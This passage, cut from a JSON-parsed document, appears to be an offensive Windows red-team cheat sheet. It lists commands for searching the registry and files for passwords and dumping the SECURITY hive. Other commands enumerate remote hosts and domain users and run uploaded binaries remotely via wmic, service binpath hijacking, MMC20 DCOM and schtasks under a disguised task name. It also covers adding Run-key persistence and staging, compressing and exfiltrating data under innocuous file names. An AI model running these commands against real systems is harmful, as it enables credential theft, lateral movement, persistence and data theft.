      "content": "netsh interface ip set dnsservers name= \"<INTERFACE_NAME>\" static <DNS_SERVER_IP>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set DNS server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "netsh interface ip set address name= \"<INTERFACE_NAME>\" source=dhcp",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set interface to use DHCP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Registry Commands & Important Keys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg query HKLM /f password /t REG_SZ /s",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Search registry for password",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg save HKLM\\Security security.hive",
      "level": 0,
      "metadata": {
        "file_paths": [
          "security.hive"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Requires SYSTEM privileges)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Save security hive to file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/v ProductName",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/v InstallDate",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/v RegisteredOwner",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/v SystemRoot",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OS information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\System\\CurrentControlSet\\Control\\TimeZoneInformation /v ActiveTimeBias",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Time zone (offset in minutes from UTC)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mapped network drives",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\System\\MountedDevices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mounted devices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\System\\CurrentControlSet\\Enum\\USB",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "USB devices",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Security\\Policy\\PolAdTev",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Audit policy enumeration (Requires SYSTEM privileges)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\SYSTEM\\CurrentControlSet\\Services",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kernel/user services",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKLM\\Software",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Installed software for all users",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Installed software for current user",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Wordpad\\Recent File List",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Recent WordPad documents",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Recent typed entries in the Run dialog box",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Typed URLs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Regedit /v LastKey",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Last registry key accessed via regedit.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "regedit.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HKCU\\Software\\SimonTatham\\Putty\\Sessions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Saved User SSH Connection Information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote System Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net session \\\\<IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display sessions for remote system",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic /node: <IP_ADDRESS> computersystem get username",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display logged in user on remote machine",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic /node: <IP_ADDRESS> /user:<DOMAIN>\\<USERNAME> /password:<PASSWORD> process call create \"\\\\<IP_ADDRESS>\\<SHARE_FOLDER>\\<FILE_PATH>\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Execute file hosted over SMB on remote system with specified credentials",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic /node: <IP_ADDRESS> process list brief /every:1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display process listing every second for remote machine",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg query \\\\<IP_ADDRESS>\\<REG_HIVE>\\<REG_KEY> /v <REG_VALUE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Query remote registry",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tasklist /S <IP_ADDRESS> /v",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display process listing on remote system",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "systeminfo /S <IP_ADDRESS> /U <DOMAIN>\\<USERNAME> /P <PASSWORD>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display system information for remote system",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net view \\\\<IP_ADDRESS> /all",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display shares of remote computer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net use * \\\\<IP_ADDRESS>\\<SHARE_FOLDER> /user:<DOMAIN>\\<USERNAME> <PASSWORD>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect to remote filesystem with specified user account",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "REG ADD \"\\\\<IP_ADDRESS>\\HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"My App\" /t REG_SZ /F /D \"<FILE_PATH>\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add registry key to remote system",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xcopy /s \\\\<IP_ADDRESS>\\<SHARE_FOLDER> <LOCAL_DIR>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Copy remote folder",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dir \\\\<IP_ADDRESS>\\c$",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display system uptime - look for creation date of pagefile.sys. This is the last time the system started",
      "level": 0,
      "metadata": {
        "file_paths": [
          "pagefile.sys"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tasklist /v /s <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display processes (look for AV, logged on users, programs of interest, etc.)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dir \\\\<IP_ADDRESS>\\c$",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display system architecture - Presence of \"Program Files (x86)\" means 64-bit system",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Data Mining Windows",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "This section details useful techniques pertaining to data mining files and documents from Windows computers. This section covers finding files of interest, compression, various tree techniques, and more.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File Info & Searching",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dir /a /s /b C:\\*pdf*",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Search for all PDFs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "findstr /SI password *.txt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Search current and subdirectories for .txt files for case insensitive string \"password\"",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "type <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display file contents",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "find /I \"<STRING_TO_SEARCH>\" <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display all lines in a file that match case insensitive <STRING>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "type <FILE_PATH> | find /c /v \"\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display line count for a file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dir C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Then run the following command on the .lnk:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "type <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Look for full file path in output)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate recently opened files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tree Filesystem to Searchable File",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Three separate options to “tree” a filesystem to file on a host, compress it, download it, and then extract it for analysis.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tree.com /F /A \\\\<IP_ADDRESS>\\<FILE_PATH> > c:\\windows\\temp\\silverlight1.log",
      "level": 0,
      "metadata": {
        "file_paths": [
          "tree.com",
          "\\windows\\temp\\silverlight1.log"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Enumerate entire folder structure (and child folders) to file using tree.com",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dir /s /a \\\\<IP_ADDRESS>\\<FILE_PATH> > c:\\windows\\temp\\silverlight1.log",
      "level": 0,
      "metadata": {
        "file_paths": [
          "\\windows\\temp\\silverlight1.log"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate entire folder structure to file using “dir /s”",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "forfiles /S /C \"cmd /c echo @path\" /p <FILE_PATH> > c:\\windows\\temp\\silverlight1.log",
      "level": 0,
      "metadata": {
        "file_paths": [
          "\\windows\\temp\\silverlight1.log"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate entire folder structure to file using forfiles",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Does not work with UNC paths)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "makecab c:\\windows\\temp\\silverlight1.log c:\\windows\\temp\\silverlight_compressed.zip",
      "level": 0,
      "metadata": {
        "file_paths": [
          "\\windows\\temp\\silverlight1.log",
          "\\windows\\temp\\silverlight_compressed.zip"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Compress file and download from target",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "expand c:\\users\\administrator\\desktop\\ silverlight_compressed.zip c:\\users\\administrator\\desktop\\extractedFile.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "silverlight_compressed.zip",
          "\\users\\administrator\\desktop\\extractedFile.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Extract results",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Using Volume Shadow Service (VSS)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "vssadmin list shadows",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate saved volume shadow files",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "list",
      "content": "If any copies already exist then skip creation command",
      "level": 0,
      "metadata": {
        "list_type": "bullet",
        "item_count": 1
      }
    },
    {
      "type": "paragraph",
      "content": "wmic shadowcopy call create Volume=c:\\",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Create Shadow file of c:\\ (Replace with desired drive letter)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "vssadmin list shadows",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Enumerated saved volume shadow files (should see newly created shadow). Note the \\\\?\\GLOBALROOT location",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mklink /D C:\\restore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy6\\",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create an OS link to created shadow file (Note the trailing backslash at the end of the path).",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "The target link name (restore in this case) must not exist",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Copy, exfil, interact with shadow",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rmdir c:\\restore",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remove link",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "*Windows “del” will remove actual files! *",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote Execution",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details important and useful commands that can be used to execute payloads on remote systems. Proper administrative credentials must be held to run many of the commands listed below.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc.exe Remote Execution",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sc.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Upload binary to remote machine, modify existing service to point at that binary, start the service, and re-configure the service binpath back to its original value. VSS is a service that works great for this technique, but other services can work if they meet the requirements listed in the right column below.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc \\\\<IP_ADDRESS> qc vss",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ensure service runs as LocalSystem and log original binary path",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc \\\\<IP_ADDRESS> query vss",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ensure service is currently off",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc \\\\<IP_ADDRESS> config vss binpath= \"<FILE_PATH>\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set remote machine binpath to uploaded binary",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc \\\\<IP_ADDRESS> qc vss",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ensure remote machine service binpath was set correctly",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc \\\\<IP_ADDRESS> start vss",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start service on remote machine",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc \\\\<IP_ADDRESS> stop vss",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ensure service is off before setting binpath back to original",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc \\\\<IP_ADDRESS> config vss binpath= \"<FILE_PATH>\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set remote machine service binpath back to original",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc \\\\<IP_ADDRESS> qc vss",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ensure remote machine service binpath was set back correctly",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MMC COM Object",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload binary to remote machine system folder and execute via MMC COM execution. Set the proper remote IP and uploaded binary path in the command below and execute via powershell.exe. FILEPATH = full path to target executable to start.",
      "level": 0,
      "metadata": {
        "file_paths": [
          "powershell.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: Only works against Windows Server Targets",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "powershell -ep bypass -nop -Command ([activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,”<IP_ADDRESS>”))). Document.ActiveView.ExecuteShellCommand(“<FILE_PATH>”,$null,$null,”7”)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote Schtasks Execution",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload binary to remote machine, create scheduled task pointing at that binary, run task, and delete task. Can change “OfficeUpdater” to any task name that blends into target system.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH> /s <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add task",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /query /tn OfficeUpdater /fo list /v /s <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Query task verbose",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /run /tn OfficeUpdater /s <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run task",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /delete /tn OfficeUpdater /f /s <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete task",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Active Directory",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Microsoft Windows Active Directory is a service that combines large groups of computing resources into one centralized hierarchical system. This system is comprised of user accounts, computers, objects, active directory forests, and more. Centralized authentication makes administration and expansion of computing resources much easier.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Active Directory Forest (AD Forest)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "An Active Directory forest is a collection of parent/child domains and is used to share authentication between domains, while keeping those domain objects (computers, users, etc.) isolated.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "If an organization called Corp has a Chicago and San Diego office, they may choose to create a forest made up of a parent domain, and two child domains.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Common Active Directory Object Types",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Computer:Represents a workstation or server in a domain.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User:Represent users or individuals in a domain.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Organizational Unit (OU):This type of object is a “container” that can include other objects. This can be useful if a company wants to further containerize objects such as putting all accounting users and computers into an OU called “accounting”.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Active Directory Exploitation Checklist",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows hashes are NOT salted. Password re-use is very common for users that have multiple user accounts in different domains.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain Service account passwords may not be changed often.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Certain “Enterprise Admin” accounts may be used to traverse forest domains.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domains should utilize separation of privilege. Workstation Admins administer workstations, SQL Admins administer SQL Servers, etc.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain and User Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details important and useful domain enumeration commands. These commands can display computers, users, groups, etc.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain Enumeration with Net.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "Net.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Net.exe will NOT list groups in groups. Refer to DSQuery section to enumerate groups in groups.",
      "level": 0,
      "metadata": {
        "file_paths": [
          "Net.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net localgroup administrators",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List accounts with administrative access to the current machine",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net localgroup administrators /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List accounts and groups with administrative access to the domain controller",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net view /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display hosts currently visible on the network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net user /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display all users in current domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net user <USERNAME> /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display user information for domain user account (status, policy, groups, etc.)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net accounts /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display domain account policies",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net group /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display domain groups",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "net group \"<GROUPNAME>\" /domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
